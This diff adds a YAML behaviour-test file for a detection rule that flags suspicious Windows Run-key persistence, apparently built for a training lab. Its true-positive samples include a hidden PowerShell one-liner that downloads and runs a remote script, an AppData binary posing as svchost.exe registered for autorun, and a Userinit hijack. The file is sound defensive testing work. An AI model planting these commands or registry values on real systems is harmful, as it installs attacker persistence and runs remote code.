@@ -1,0 +1,90 @@
+# Behaviour tests for win_persistence_run_key_suspicious_path.yml
+#
+# The benign cases below are the exact Run-key values created by
+# provision/windows/21-ws-victimise.ps1, so this rule is tested against the
+# same background noise the live lab generates.
+
+rule: win_persistence_run_key_suspicious_path.yml
+
+true_positives:
+
+  - name: PowerShell one-liner planted in the user Run key
+    event:
+      EventID: 13
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      EventType: SetValue
+      TargetObject: HKU\S-1-5-21-1004336348-1177238915-682003330-1142\Software\Microsoft\Windows\CurrentVersion\Run\Updater
+      Details: powershell.exe -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://10.13.37.40/p.ps1')"
+      Image: C:\Windows\System32\reg.exe
+      User: NEXUS\s.alqahtani
+
+  - name: Binary dropped in AppData and registered for autorun
+    event:
+      EventID: 13
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      EventType: SetValue
+      TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityHealth
+      Details: C:\Users\s.alqahtani\AppData\Roaming\svchost.exe
+      Image: C:\Users\s.alqahtani\AppData\Local\Temp\dropper.exe
+      User: NEXUS\s.alqahtani
+
+  - name: Userinit hijack chaining a second executable
+    event:
+      EventID: 13
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      EventType: SetValue
+      TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
+      Details: C:\Windows\system32\userinit.exe,C:\Users\Public\wupdate.exe
+      Image: C:\Windows\System32\reg.exe
+      User: NEXUS\adm.helpdesk
+
+false_positives:
+
+  - name: NexusVPN agent installed under Program Files
+    # The lab's own benign Run key. Signed installer, non-writable path.
+    event:
+      EventID: 13
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      EventType: SetValue
+      TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NexusVpnAgent
+      Details: C:\Program Files\NexusVPN\agent.exe --tray
+      Image: C:\Windows\System32\msiexec.exe
+      User: NT AUTHORITY\SYSTEM
+
+  - name: NexusBackup tray application
+    event:
+      EventID: 13
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      EventType: SetValue
+      TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NexusBackupTray
+      Details: C:\Program Files\NexusBackup\tray.exe
+      Image: C:\Windows\System32\msiexec.exe
+      User: NT AUTHORITY\SYSTEM
+
+  - name: Run key value being deleted during uninstall
+    event:
+      EventID: 13
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      EventType: SetValue
+      TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OldAgent
+      Details: (Empty)
+      Image: C:\Windows\System32\msiexec.exe
+      User: NT AUTHORITY\SYSTEM
+
+  - name: Unrelated registry key with a Temp path
+    # Not an autorun location, so not persistence via this technique.
+    event:
+      EventID: 13
+      Channel: Microsoft-Windows-Sysmon/Operational
+      Computer: ws01.nexus.lab
+      EventType: SetValue
+      TargetObject: HKLM\SOFTWARE\Nexus\Installer\LastTempDir
+      Details: C:\Users\a.alharbi\AppData\Local\Temp\setup
+      Image: C:\Windows\System32\msiexec.exe
+      User: NT AUTHORITY\SYSTEM
